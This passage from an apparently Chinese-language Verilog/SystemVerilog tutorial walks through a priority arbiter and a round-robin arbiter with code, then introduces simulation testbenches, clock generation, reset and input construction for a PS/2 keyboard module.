punctuation">:</span><span class="token number">0</span><span class="token punctuation">]</span> user_comb<span class="token punctuation">;</span>  <span class="token important">always_comb</span> <span class="token keyword">begin</span>    valid_comb <span class="token operator">=</span> <span class="token number">1'b0</span><span class="token punctuation">;</span>    user_comb <span class="token operator">=</span> <span class="token number">2'd0</span><span class="token punctuation">;</span>    <span class="token keyword">casez</span> <span class="token punctuation">(</span>request<span class="token punctuation">)</span>      <span class="token number">4'b???1</span><span class="token punctuation">:</span> <span class="token keyword">begin</span>        valid_comb <span class="token operator">=</span> <span class="token number">1'b1</span><span class="token punctuation">;</span>        user_comb <span class="token operator">=</span> <span class="token number">2'd0</span><span class="token punctuation">;</span>      <span class="token keyword">end</span>      <span class="token number">4'b??10</span><span class="token punctuation">:</span> <span class="token keyword">begin</span>        valid_comb <span class="token operator">=</span> <span class="token number">1'b1</span><span class="token punctuation">;</span>        user_comb <span class="token operator">=</span> <span class="token number">2'd1</span><span class="token punctuation">;</span>      <span class="token keyword">end</span>      <span class="token number">4'b?100</span><span class="token punctuation">:</span> <span class="token keyword">begin</span>        valid_comb <span class="token operator">=</span> <span class="token number">1'b1</span><span class="token punctuation">;</span>        user_comb <span class="token operator">=</span> <span class="token number">2'd2</span><span class="token punctuation">;</span>      <span class="token keyword">end</span>      <span class="token number">4'b1000</span><span class="token punctuation">:</span> <span class="token keyword">begin</span>        valid_comb <span class="token operator">=</span> <span class="token number">1'b1</span><span class="token punctuation">;</span>        user_comb <span class="token operator">=</span> <span class="token number">2'd3</span><span class="token punctuation">;</span>      <span class="token keyword">end</span>    <span class="token keyword">endcase</span>  <span class="token keyword">end</span>  <span class="token keyword">assign</span> valid <span class="token operator">=</span> valid_comb<span class="token punctuation">;</span>  <span class="token keyword">assign</span> user <span class="token operator">=</span> user_comb<span class="token punctuation">;</span><span class="token keyword">endmodule</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>实现组合逻辑电路的一种方法是用 <code>assign</code>, 如 <code>assign valid = |request</code>; 但是涉及更复杂的组合逻辑时, 会比较复杂. 可以在 <code>always_comb</code> 块中灵活地使用各种条件语句, 包括 <code>casez</code> 语句, 首先设置了一个默认的结果, 这样如果下面所有的 <code>casez</code> 都不满足, 那么输出的就是默认值.</p><h3 id="总结-3"><a href="#总结-3" class="headerlink" title="总结"></a>总结</h3><p>总结规律: </p><ol><li>确定输入输出;</li><li>确定需要哪些寄存器;</li><li>实现时序逻辑;</li><li>实现组合逻辑.</li></ol><h2 id="循环优先级仲裁器"><a href="#循环优先级仲裁器" class="headerlink" title="循环优先级仲裁器"></a>循环优先级仲裁器</h2><h3 id="需求-5"><a href="#需求-5" class="headerlink" title="需求"></a>需求</h3><p>实现一个循环优先级仲裁器 (round robin arbiter), 根据最后一次获取资源的用户, 决定下一次获取资源的优先级. 当一个用户 <code>A</code> 不再获取资源 (对应位 <code>request</code> 从 <code>1</code> 变成 <code>0</code>) 时, 重新选择一个可以获取资源的用户, 优先级是从 <code>A</code> 的下一个用户开始为最高优先级, 如果溢出了就绕回.</p><p>输入: </p><ol><li><code>request</code>: 宽度为 4, 每一位 1 表示对应的用户请求访问资源, 0 表示不请求.</li><li><code>clock</code>: 1MHz 的时钟.</li><li><code>reset</code>: 复位信号.</li></ol><p>输出: </p><ol><li><code>valid</code>: 1 表示有用户请求访问资源, 0 表示无用户请求访问资源.</li><li><code>user</code>: 宽度为 2, 如果有用户请求访问资源时, 输出获得资源的用户的编号.</li></ol><h3 id="波形-2"><a href="#波形-2" class="headerlink" title="波形"></a>波形</h3><p>相比上一个例子, 有两个比较大的区别: </p><ol><li>无状态仲裁器中, 如果出现了优先级更高的用户, 资源的访问权立即切换; 循环优先级仲裁器中, 只有用户放弃了请求才会切换;</li><li>仲裁时, 优先级根据最后一次获得访问权的用户来决定.</li></ol><h3 id="电路-5"><a href="#电路-5" class="headerlink" title="电路"></a>电路</h3><p>由于优先级和最后一次获得访问权的用户有关, 需要<strong>时序逻辑</strong>实现. 用 <code>user_reg</code> 记录最后一次获得访问权的用户编号: </p><ol><li>什么时候更新: 上一个周期没有用户获得访问权, 这个周期 <code>request</code> 不等于零; 当前周期获得访问权的用户对应的 <code>request</code> 位由 <code>1</code> 变成了 <code>0</code>.</li><li>更新成什么: 按照优先级顺序在 <code>request</code> 里选出目前优先级最高的用户.</li></ol><p>由此, 在这一类内部具有状态, 又需要在输入变化的同一个周期输出的情况, 需要用时序逻辑来保存状态, 同时用组合逻辑来实现同周期的输出, 把二者结合起来.</p><p>第一部分是修改后的优先级编码器, 额外添加输入 <code>last_user</code> 表示最后一次获得访问权的用户编号. </p><p>第二部分是维护 <code>user_reg</code> 状态. 第一个模块是上面提到的修改后的优先级编码器, 第二个模块是整体的循环优先级仲裁器, 内部例化第一个模块. </p><h3 id="代码-5"><a href="#代码-5" class="headerlink" title="代码"></a>代码</h3><p>实现第一部分逻辑, 根据最后一次获取资源的用户编号确定优先级的优先级编码器: </p><pre class="line-numbers language-verilog" data-language="verilog"><code class="language-verilog"><span class="token keyword">module</span> rr_priority_encoder <span class="token punctuation">(</span>  <span class="token keyword">input</span> <span class="token keyword">wire</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">]</span> request<span class="token punctuation">,</span>  <span class="token keyword">input</span> <span class="token keyword">wire</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">]</span> last_user<span class="token punctuation">,</span>  <span class="token keyword">output</span> <span class="token keyword">wire</span> valid<span class="token punctuation">,</span>  <span class="token keyword">output</span> <span class="token keyword">wire</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">]</span> user<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">logic</span> valid_comb<span class="token punctuation">;</span>  <span class="token keyword">logic</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">]</span> user_comb<span class="token punctuation">;</span>  <span class="token important">always_comb</span> <span class="token keyword">begin</span>    valid_comb <span class="token operator">=</span> <span class="token number">1'b0</span><span class="token punctuation">;</span>    user_comb <span class="token operator">=</span> <span class="token number">2'd0</span><span class="token punctuation">;</span>    <span class="token comment">// naive way</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>last_user <span class="token operator">==</span> <span class="token number">2'd3</span><span class="token punctuation">)</span> <span class="token keyword">begin</span>      <span class="token keyword">casez</span> <span class="token punctuation">(</span>request<span class="token punctuation">)</span>        <span class="token number">4'b???1</span><span class="token punctuation">:</span> <span class="token keyword">begin</span>          valid_comb <span class="token operator">=</span> <span class="token number">1'b1</span><span class="token punctuation">;</span>          user_comb <span class="token operator">=</span> <span class="token number">2'd0</span><span class="token punctuation">;</span>        <span class="token keyword">end</span>        <span class="token number">4'b??10</span><span class="token punctuation">:</span> <span class="token keyword">begin</span>          valid_comb <span class="token operator">=</span> <span class="token number">1'b1</span><span class="token punctuation">;</span>          user_comb <span class="token operator">=</span> <span class="token number">2'd1</span><span class="token punctuation">;</span>        <span class="token keyword">end</span>        <span class="token number">4'b?100</span><span class="token punctuation">:</span> <span class="token keyword">begin</span>          valid_comb <span class="token operator">=</span> <span class="token number">1'b1</span><span class="token punctuation">;</span>          user_comb <span class="token operator">=</span> <span class="token number">2'd2</span><span class="token punctuation">;</span>        <span class="token keyword">end</span>        <span class="token number">4'b1000</span><span class="token punctuation">:</span> <span class="token keyword">begin</span>          valid_comb <span class="token operator">=</span> <span class="token number">1'b1</span><span class="token punctuation">;</span>          user_comb <span class="token operator">=</span> <span class="token number">2'd3</span><span class="token punctuation">;</span>        <span class="token keyword">end</span>      <span class="token keyword">endcase</span>    <span class="token keyword">end</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>last_user <span class="token operator">==</span> <span class="token number">2'd0</span><span class="token punctuation">)</span> <span class="token keyword">begin</span>      <span class="token keyword">casez</span> <span class="token punctuation">(</span>request<span class="token punctuation">)</span>        <span class="token number">4'b??1?</span><span class="token punctuation">:</span> <span class="token keyword">begin</span>          valid_comb <span class="token operator">=</span> <span class="token number">1'b1</span><span class="token punctuation">;</span>          user_comb <span class="token operator">=</span> <span class="token number">2'd1</span><span class="token punctuation">;</span>        <span class="token keyword">end</span>        <span class="token number">4'b?10?</span><span class="token punctuation">:</span> <span class="token keyword">begin</span>          valid_comb <span class="token operator">=</span> <span class="token number">1'b1</span><span class="token punctuation">;</span>          user_comb <span class="token operator">=</span> <span class="token number">2'd2</span><span class="token punctuation">;</span>        <span class="token keyword">end</span>        <span class="token number">4'b100?</span><span class="token punctuation">:</span> <span class="token keyword">begin</span>          valid_comb <span class="token operator">=</span> <span class="token number">1'b1</span><span class="token punctuation">;</span>          user_comb <span class="token operator">=</span> <span class="token number">2'd3</span><span class="token punctuation">;</span>        <span class="token keyword">end</span>        <span class="token number">4'b0001</span><span class="token punctuation">:</span> <span class="token keyword">begin</span>          valid_comb <span class="token operator">=</span> <span class="token number">1'b1</span><span class="token punctuation">;</span>          user_comb <span class="token operator">=</span> <span class="token number">2'd0</span><span class="token punctuation">;</span>        <span class="token keyword">end</span>      <span class="token keyword">endcase</span>    <span class="token keyword">end</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>last_user <span class="token operator">==</span> <span class="token number">2'd1</span><span class="token punctuation">)</span> <span class="token keyword">begin</span>      <span class="token keyword">casez</span> <span class="token punctuation">(</span>request<span class="token punctuation">)</span>        <span class="token number">4'b?1??</span><span class="token punctuation">:</span> <span class="token keyword">begin</span>          valid_comb <span class="token operator">=</span> <span class="token number">1'b1</span><span class="token punctuation">;</span>          user_comb <span class="token operator">=</span> <span class="token number">2'd2</span><span class="token punctuation">;</span>        <span class="token keyword">end</span>        <span class="token number">4'b10??</span><span class="token punctuation">:</span> <span class="token keyword">begin</span>          valid_comb <span class="token operator">=</span> <span class="token number">1'b1</span><span class="token punctuation">;</span>          user_comb <span class="token operator">=</span> <span class="token number">2'd3</span><span class="token punctuation">;</span>        <span class="token keyword">end</span>        <span class="token number">4'b00?1</span><span class="token punctuation">:</span> <span class="token keyword">begin</span>          valid_comb <span class="token operator">=</span> <span class="token number">1'b1</span><span class="token punctuation">;</span>          user_comb <span class="token operator">=</span> <span class="token number">2'd0</span><span class="token punctuation">;</span>        <span class="token keyword">end</span>        <span class="token number">4'b0010</span><span class="token punctuation">:</span> <span class="token keyword">begin</span>          valid_comb <span class="token operator">=</span> <span class="token number">1'b1</span><span class="token punctuation">;</span>          user_comb <span class="token operator">=</span> <span class="token number">2'd1</span><span class="token punctuation">;</span>        <span class="token keyword">end</span>      <span class="token keyword">endcase</span>    <span class="token keyword">end</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>last_user <span class="token operator">==</span> <span class="token number">2'd2</span><span class="token punctuation">)</span> <span class="token keyword">begin</span>      <span class="token keyword">casez</span> <span class="token punctuation">(</span>request<span class="token punctuation">)</span>        <span class="token number">4'b1???</span><span class="token punctuation">:</span> <span class="token keyword">begin</span>          valid_comb <span class="token operator">=</span> <span class="token number">1'b1</span><span class="token punctuation">;</span>          user_comb <span class="token operator">=</span> <span class="token number">2'd3</span><span class="token punctuation">;</span>        <span class="token keyword">end</span>        <span class="token number">4'b0??1</span><span class="token punctuation">:</span> <span class="token keyword">begin</span>          valid_comb <span class="token operator">=</span> <span class="token number">1'b1</span><span class="token punctuation">;</span>          user_comb <span class="token operator">=</span> <span class="token number">2'd0</span><span class="token punctuation">;</span>        <span class="token keyword">end</span>        <span class="token number">4'b0?10</span><span class="token punctuation">:</span> <span class="token keyword">begin</span>          valid_comb <span class="token operator">=</span> <span class="token number">1'b1</span><span class="token punctuation">;</span>          user_comb <span class="token operator">=</span> <span class="token number">2'd1</span><span class="token punctuation">;</span>        <span class="token keyword">end</span>        <span class="token number">4'b0100</span><span class="token punctuation">:</span> <span class="token keyword">begin</span>          valid_comb <span class="token operator">=</span> <span class="token number">1'b1</span><span class="token punctuation">;</span>          user_comb <span class="token operator">=</span> <span class="token number">2'd2</span><span class="token punctuation">;</span>        <span class="token keyword">end</span>      <span class="token keyword">endcase</span>    <span class="token keyword">end</span>  <span class="token keyword">end</span>  <span class="token keyword">assign</span> valid <span class="token operator">=</span> valid_comb<span class="token punctuation">;</span>  <span class="token keyword">assign</span> user <span class="token operator">=</span> user_comb<span class="token punctuation">;</span><span class="token keyword">endmodule</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>接着是循环优先级仲裁器: </p><pre class="line-numbers language-verilog" data-language="verilog"><code class="language-verilog"><span class="token keyword">module</span> rr_arbiter <span class="token punctuation">(</span>  <span class="token keyword">input</span> <span class="token keyword">wire</span> clock<span class="token punctuation">,</span>  <span class="token keyword">input</span> <span class="token keyword">wire</span> reset<span class="token punctuation">,</span>  <span class="token keyword">input</span> <span class="token keyword">wire</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">]</span> request<span class="token punctuation">,</span>  <span class="token keyword">output</span> <span class="token keyword">wire</span> valid<span class="token punctuation">,</span>  <span class="token keyword">output</span> <span class="token keyword">wire</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">]</span> user<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">logic</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">]</span> user_reg<span class="token punctuation">;</span>  <span class="token keyword">logic</span> valid_reg<span class="token punctuation">;</span>  <span class="token keyword">logic</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">]</span> user_comb<span class="token punctuation">;</span>  <span class="token keyword">logic</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">]</span> priority_encoder_user_comb<span class="token punctuation">;</span>  rr_priority_encoder rr_priority_encoder_inst <span class="token punctuation">(</span>    <span class="token punctuation">.</span><span class="token function">request</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">.</span><span class="token function">last_user</span><span class="token punctuation">(</span>user_reg<span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">.</span><span class="token function">valid</span><span class="token punctuation">(</span>valid<span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">.</span><span class="token function">user</span><span class="token punctuation">(</span>priority_encoder_user_comb<span class="token punctuation">)</span>  <span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// sequential</span>  <span class="token important">always_ff @</span> <span class="token punctuation">(</span><span class="token keyword">posedge</span> clock<span class="token punctuation">)</span> <span class="token keyword">begin</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>reset<span class="token punctuation">)</span> <span class="token keyword">begin</span>      user_reg <span class="token operator">&lt;=</span> <span class="token number">2'd0</span><span class="token punctuation">;</span>      valid_reg <span class="token operator">&lt;=</span> <span class="token number">1'b0</span><span class="token punctuation">;</span>    <span class="token keyword">end</span> <span class="token keyword">else</span> <span class="token keyword">begin</span>      valid_reg <span class="token operator">&lt;=</span> valid<span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>valid_reg <span class="token operator">&amp;&amp;</span> valid<span class="token punctuation">)</span> <span class="token keyword">begin</span>        <span class="token comment">// case 1: non valid -&gt; valid</span>        user_reg <span class="token operator">&lt;=</span> priority_encoder_user_comb<span class="token punctuation">;</span>      <span class="token keyword">end</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>valid_reg <span class="token operator">&amp;&amp;</span> valid <span class="token operator">&amp;&amp;</span> request<span class="token punctuation">[</span>user_reg<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">begin</span>        <span class="token comment">// case 2: persist</span>      <span class="token keyword">end</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>valid_reg <span class="token operator">&amp;&amp;</span> valid <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>request<span class="token punctuation">[</span>user_reg<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">begin</span>        <span class="token comment">// case 3: next user</span>        user_reg <span class="token operator">&lt;=</span> priority_encoder_user_comb<span class="token punctuation">;</span>      <span class="token keyword">end</span>    <span class="token keyword">end</span>  <span class="token keyword">end</span>  <span class="token comment">// combinatorial</span>  <span class="token important">always_comb</span> <span class="token keyword">begin</span>    <span class="token comment">// default</span>    user_comb <span class="token operator">=</span> <span class="token number">2'b0</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>valid_reg <span class="token operator">&amp;&amp;</span> valid<span class="token punctuation">)</span> <span class="token keyword">begin</span>      <span class="token comment">// case 1: non valid -&gt; valid</span>      user_comb <span class="token operator">=</span> priority_encoder_user_comb<span class="token punctuation">;</span>    <span class="token keyword">end</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>valid_reg <span class="token operator">&amp;&amp;</span> valid <span class="token operator">&amp;&amp;</span> request<span class="token punctuation">[</span>user_reg<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">begin</span>      <span class="token comment">// case 2: persist</span>      user_comb <span class="token operator">=</span> user_reg<span class="token punctuation">;</span>    <span class="token keyword">end</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>valid_reg <span class="token operator">&amp;&amp;</span> valid <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>request<span class="token punctuation">[</span>user_reg<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">begin</span>      <span class="token comment">// case 3: next user</span>      user_comb <span class="token operator">=</span> priority_encoder_user_comb<span class="token punctuation">;</span>    <span class="token keyword">end</span>  <span class="token keyword">end</span>  <span class="token keyword">assign</span> user <span class="token operator">=</span> user_comb<span class="token punctuation">;</span><span class="token keyword">endmodule</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="仿真"><a href="#仿真" class="headerlink" title="仿真"></a>仿真</h2><p><strong>描述数字电路的 Verilog 和用来仿真的 Verilog 使用完全不同的编写思路和实现方法.</strong> 前者与电路一一对应, 而后者更像是 C 这种过程式的编程语言.</p><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><pre class="line-numbers language-verilog" data-language="verilog"><code class="language-verilog"><span class="token keyword">module</span> add2 <span class="token punctuation">(</span>  <span class="token keyword">input</span> <span class="token keyword">wire</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">]</span> a<span class="token punctuation">,</span>  <span class="token keyword">input</span> <span class="token keyword">wire</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">]</span> b<span class="token punctuation">,</span>  <span class="token keyword">output</span> <span class="token keyword">wire</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">]</span> c<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">assign</span> c <span class="token operator">=</span> a <span class="token operator">+</span> b<span class="token punctuation">;</span><span class="token keyword">endmodule</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>要给这个模块输入数据, 要人为地设置模块的输入: </p><pre class="line-numbers language-verilog" data-language="verilog"><code class="language-verilog"><span class="token constant">`timescale</span> <span class="token number">1</span>ns<span class="token operator">/</span><span class="token number">1</span>ps<span class="token keyword">module</span> add2_tb <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">reg</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">]</span> a<span class="token punctuation">;</span>  <span class="token keyword">reg</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">]</span> b<span class="token punctuation">;</span>  <span class="token keyword">wire</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">]</span> c<span class="token punctuation">;</span>  <span class="token keyword">initial</span> <span class="token keyword">begin</span>    a <span class="token operator">=</span> <span class="token number">2'b01</span><span class="token punctuation">;</span>    b <span class="token operator">=</span> <span class="token number">2'b10</span><span class="token punctuation">;</span>    <span class="token number">#1</span><span class="token punctuation">;</span>    <span class="token kernel-function property">$finish</span><span class="token punctuation">;</span>  <span class="token keyword">end</span>  add2 inst <span class="token punctuation">(</span>    <span class="token punctuation">.</span><span class="token function">a</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">.</span><span class="token function">b</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">.</span><span class="token function">c</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span>  <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">endmodule</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>由于 <code>c</code> 连接到 <code>add2</code> 模块的输出, 所以要用 <code>wire</code>; 其他要输入到 <code>add2</code> 模块中, 所以用 <code>reg</code>. 运行 <code>#1;</code> 命令, 表示等待 <code>1ns</code>, 然后再运行 <code>$finish;</code>, 表示仿真结束.</p><h3 id="时钟"><a href="#时钟" class="headerlink" title="时钟"></a>时钟</h3><p>仿真一个带有时序逻辑的模块, 使用前面的秒表的例子: </p><pre class="line-numbers language-verilog" data-language="verilog"><code class="language-verilog"><span class="token keyword">module</span> timer <span class="token punctuation">(</span>  <span class="token keyword">input</span> <span class="token keyword">wire</span> clock<span class="token punctuation">,</span>  <span class="token keyword">input</span> <span class="token keyword">wire</span> reset<span class="token punctuation">,</span>  <span class="token keyword">output</span> <span class="token keyword">wire</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">]</span> timer<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">reg</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">]</span> timer_reg<span class="token punctuation">;</span>  <span class="token keyword">reg</span> <span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">]</span> counter_reg<span class="token punctuation">;</span>  <span class="token comment">// sequential</span>  <span class="token important">always @</span> <span class="token punctuation">(</span><span class="token keyword">posedge</span> clock<span class="token punctuation">)</span> <span class="token keyword">begin</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>reset<span class="token punctuation">)</span> <span class="token keyword">begin</span>      timer_reg <span class="token operator">&lt;=</span> <span class="token number">4'b0</span><span class="token punctuation">;</span>      counter_reg <span class="token operator">&lt;=</span> <span class="token number">20'b0</span><span class="token punctuation">;</span>    <span class="token keyword">end</span> <span class="token keyword">else</span> <span class="token keyword">begin</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>counter_reg <span class="token operator">==</span> <span class="token number">20'd999999</span><span class="token punctuation">)</span> <span class="token keyword">begin</span>        timer_reg <span class="token operator">&lt;=</span> timer_reg <span class="token operator">+</span> <span class="token number">4'b1</span><span class="token punctuation">;</span>        counter_reg <span class="token operator">&lt;=</span> <span class="token number">20'b0</span><span class="token punctuation">;</span>      <span class="token keyword">end</span> <span class="token keyword">else</span> <span class="token keyword">begin</span>        counter_reg <span class="token operator">&lt;=</span> counter_reg <span class="token operator">+</span> <span class="token number">20'b1</span><span class="token punctuation">;</span>      <span class="token keyword">end</span>    <span class="token keyword">end</span>  <span class="token keyword">end</span>  <span class="token comment">// combinatorial</span>  <span class="token keyword">assign</span> timer <span class="token operator">=</span> timer_reg<span class="token punctuation">;</span><span class="token keyword">endmodule</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>例化 <code>timer</code> 模块, 连接输入输出信号. 时钟信号以一个固定的频率在 0 和 1 之间变化. 如果频率是 50MHz, 那么一个周期每 10ns 变化一次. 这样下去就可以构造出一个时钟信号:</p><pre class="line-numbers language-verilog" data-language="verilog"><code class="language-verilog"><span class="token keyword">initial</span> <span class="token keyword">begin</span>  reset <span class="token operator">=</span> <span class="token number">1'b0</span><span class="token punctuation">;</span>  clock <span class="token operator">=</span> <span class="token number">1'b1</span><span class="token punctuation">;</span>  <span class="token number">#10</span><span class="token punctuation">;</span>  clock <span class="token operator">=</span> <span class="token number">1'b0</span><span class="token punctuation">;</span>  <span class="token number">#10</span><span class="token punctuation">;</span>  clock <span class="token operator">=</span> <span class="token number">1'b1</span><span class="token punctuation">;</span>  <span class="token number">#10</span><span class="token punctuation">;</span>  clock <span class="token operator">=</span> <span class="token number">1'b0</span><span class="token punctuation">;</span>  <span class="token number">#10</span><span class="token punctuation">;</span><span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>希望仿真更多时钟周期, 自动生成时钟信号:</p><pre class="line-numbers language-verilog" data-language="verilog"><code class="language-verilog"><span class="token keyword">initial</span> <span class="token keyword">begin</span>  reset <span class="token operator">=</span> <span class="token number">1'b0</span><span class="token punctuation">;</span>  clock <span class="token operator">=</span> <span class="token number">1'b1</span><span class="token punctuation">;</span><span class="token keyword">end</span><span class="token important">always</span> <span class="token number">#10</span> clock <span class="token operator">=</span> <span class="token operator">~</span>clock<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="复位"><a href="#复位" class="headerlink" title="复位"></a>复位</h3><p>处理好时钟后仿真上面的代码, 会发现 <code>timer</code> 输出一直是 <code>x</code>, 因为 <code>timer</code> 没有被复位. 需要先设置 <code>reset</code> 为 1, 再设置 <code>reset</code> 为 0: </p><pre class="line-numbers language-verilog" data-language="verilog"><code class="language-verilog"><span class="token keyword">initial</span> <span class="token keyword">begin</span>  reset <span class="token operator">=</span> <span class="token number">1'b0</span><span class="token punctuation">;</span>  clock <span class="token operator">=</span> <span class="token number">1'b1</span><span class="token punctuation">;</span>  <span class="token number">#10</span><span class="token punctuation">;</span>  reset <span class="token operator">=</span> <span class="token number">1'b1</span><span class="token punctuation">;</span>  <span class="token number">#10</span><span class="token punctuation">;</span>  reset <span class="token operator">=</span> <span class="token number">1'b0</span><span class="token punctuation">;</span><span class="token keyword">end</span><span class="token important">always</span> <span class="token number">#10</span> clock <span class="token operator">=</span> <span class="token operator">~</span>clock<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="构造输入"><a href="#构造输入" class="headerlink" title="构造输入"></a>构造输入</h3><p>目前的仿真顶层模块没有提供要测试的模块的其他输入信号, 还需要针对特定的协议人为构造输入.</p><pre class="line-numbers language-verilog" data-language="verilog"><code class="language-verilog"><span class="token keyword">reg</span> ps2_clock<span class="token punctuation">;</span><span class="token keyword">reg</span> ps2_data<span class="token punctuation">;</span>ps2_keyboard dut <span class="token punctuation">(</span>  <span class="token punctuation">.</span><span class="token function">clock</span><span class="token punctuation">(</span>clock<span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token punctuation">.</span><span class="token function">reset</span><span class="token punctuation">(</span>reset<span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token punctuation">.</span><span class="token function">ps2_clock</span><span class="token 